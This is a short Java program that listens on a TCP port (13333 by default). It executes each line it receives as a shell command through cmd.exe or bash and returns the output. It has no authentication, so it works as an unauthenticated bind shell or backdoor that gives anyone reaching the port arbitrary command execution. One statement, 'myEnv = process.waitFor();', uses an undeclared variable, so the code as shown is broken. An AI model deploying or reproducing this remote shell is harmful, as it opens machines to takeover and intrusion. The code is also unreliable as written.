import java.net.*;
import java.io.*;
import java.util.*;

//#:cmd

class Server {
    private boolean isWindows = System.getProperty("os.name").toLowerCase().startsWith("windows");
    private int port;
    private ServerSocket server;
    private String[] command = {};
    public int getPort() { return port; }

    private void initShell() {        
        command = isWindows ? new String[]{"cmd.exe", "/c"} : new String[]{"bash", "-c"};
    }

    Server(int port) {
        this.port = port;
        try {
            server = new ServerSocket(port); 
        } catch (IOException e) {
            System.err.println(e);
        }
        initShell();
    }

    private String execute(String cmd) {
        try {
            if (cmd.startsWith("#:")) {
                if (cmd.equals("#:q")) {
                    System.exit(0);
                } else if (cmd.equals("#:re")) {
                    initShell();
                }
            }
        } catch (Exception e) {
            System.err.println(e + " " + e.getMessage());
        }


        System.out.println(cmd);
        String[] realCmd = Arrays.copyOf(command, 3);
        realCmd[2] = cmd;

        StringBuilder sb = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(realCmd);

            //Map<String, String> env = processBuilder.environment();
            //env.put("ENV_KEY", "ENV_VALUE");


            Process process = processBuilder.start();
    
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = null;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            myEnv = 
            process.waitFor();
        } catch (Exception e) {
            System.err.println(e + " " + e.getMessage());
        }

        return sb.toString();
    }

    private void cycle() {
        try  {
            Socket clientSocket = server.accept();
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                BufferedWriter out = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()));
                String cmd = in.readLine();
                if (cmd == null) cmd = "";
                out.write(execute(cmd) + "\n");
                out.flush();
                in.close();
                out.close();
            } catch (IOException e) {
                System.err.println(e + " " + e.getMessage());
            } finally {
                clientSocket.close();
            }
        } catch (IOException e) {
            System.err.println(e + " " + e.getMessage());
        }
    }

    public void run() {
        for (;;) {
            cycle();
        }
    }
}

public class Remote {
    private static int port = 13333;

    public static void main(String[] argv) {
        int port;
        try {
            port = Integer.parseInt(argv[0]);
        } catch (Exception e) {
            port = 13333;
        }
        var s = new Server(port);
        s.run();
    }
}
